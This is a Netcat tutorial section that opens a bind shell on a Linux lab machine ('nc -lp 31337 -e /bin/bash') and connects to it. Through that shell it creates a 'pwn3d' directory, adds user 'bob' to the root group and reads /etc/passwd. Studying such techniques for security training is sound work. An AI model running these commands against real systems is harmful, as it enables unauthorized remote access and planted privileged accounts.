## LINUX REMOTE SHELL
Obtaining a remote shell on a Linux machine is very similar to doing it on Windows. However, there are a couple of things that appear differently. First, when you connect to a Windows shell, you are presented with a user prompt that helps you to be oriented. However, on the Linux side you will see no such prompt. It takes a little bit of getting used to, but it should not affect the operations drastically. Secondly, I mentioned in the Installation section that Netcat runs under the context of the user that has launched the process. On my Linux Mint machine, my user account is not a root user. Therefore, in order to accomplish the same goals as the preceding Windows Feature, I need to make a concession and run Netcat through sudo. This will allow me to replicate the preceding features as closely as the prior feature to provide an apple-to-apple comparison. So, as mentioned earlier, we will perform the following steps:

## Preparing the listener
Like we did on the Windows side, to prepare the listener we will type the following command into the command line:
```
sudo nc –lp 31337 –e /bin/bash
```
As we see in the screenshot that follows, we are simply calling the /bin/bash shell on connection, which is equivalent to the Windows command prompt. However, unlike the Windows counterpart, the capital L switch means something completely different in GNU Netcat, and does not even exist in the original Unix Netcat.

![image](https://user-images.githubusercontent.com/47218880/68692621-6a215480-053b-11ea-87ae-96c4ee7d1752.png)

## Connecting to the target
As I have demonstrated in the previous exercise, you simply connect to the host (as shown below) and the port that you want to connect to, and the listener will serve up the bash shell for you as follows:
```
nc 192.168.0.11 31337
```

![image](https://user-images.githubusercontent.com/47218880/68692674-7c02f780-053b-11ea-8559-96ae7db7c152.png)


## Running a directory listing on the target
As mentioned in the preceding section, the Linux side does not provide the same level of feedback to let me know if I have a bash shell. However, by typing in ones in the shell, we see that we do return a listing of the directories and files on the remote system, as shown in the following screenshot:

![image](https://user-images.githubusercontent.com/47218880/68692711-8d4c0400-053b-11ea-99f6-4317e09604f7.png)


## Making a directory on the target
As demonstrated in the following screenshot, I created a directory called pwn3d using the mkdir command and the full command is mkdir pwn3d:

![image](https://user-images.githubusercontent.com/47218880/68692769-a654b500-053b-11ea-8d00-1eb730d9ecbd.png)


Verifying if the directory was created
After performing another ls command, as demonstrated in the following screenshot, we see that the directory, in fact, was created:

![image](https://user-images.githubusercontent.com/47218880/68692802-b4a2d100-053b-11ea-9c36-eaf63f034b5f.png)

Adding a local user and placing into the root group
Finally, we use the useradd command to add a local user to the system and grant the account bob access to the root group. This, once again, is demonstrated as follows:
```
useradd –g root bob
```

![image](https://user-images.githubusercontent.com/47218880/68692827-c5ebdd80-053b-11ea-934e-3558b12a61d3.png)

Next, we want to provide the verification of the useradd action, first by doing a simple grep over /etc/passwd, as shown in the next screenshot using the following command:
```
grep bob /etc/passwd
```
![image](https://user-images.githubusercontent.com/47218880/68692871-dc923480-053b-11ea-9bcf-a044a9796e80.png)


Lastly, we will dump the entire /etc/passwd file next using the following command:
```
tail /etc/passwd
```

![image](https://user-images.githubusercontent.com/47218880/68692912-ec117d80-053b-11ea-9998-72cf64892d88.png)







